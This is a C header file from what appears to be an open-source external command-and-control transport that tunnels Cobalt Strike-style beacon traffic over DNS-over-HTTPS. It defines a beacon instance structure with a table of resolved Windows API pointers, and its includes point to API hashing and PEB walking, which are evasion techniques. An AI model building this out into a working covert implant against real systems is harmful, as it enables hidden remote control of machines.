/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#pragma once

#include <windows.h>
#include <ntstatus.h>

#include "macros.h"
#include "beacon.h"
#include "hashes.h"

typedef struct
{
	ULONG BeaconId;
	
	struct
	{
		FUNC( LocalLock );
		FUNC( LocalFree );
		FUNC( LocalSize );
		FUNC( LocalAlloc );
		FUNC( FreeLibrary );
		FUNC( LocalUnlock );
		FUNC( LocalReAlloc );
		FUNC( LoadLibraryA );
	} api;

	HMODULE Module[ 4 ];
} BEACON_INSTANCE, *PBEACON_INSTANCE;

#include "setting.h"
#include "tebpeb.h"
#include "hash.h"
#include "peb.h"
#include "pe.h"
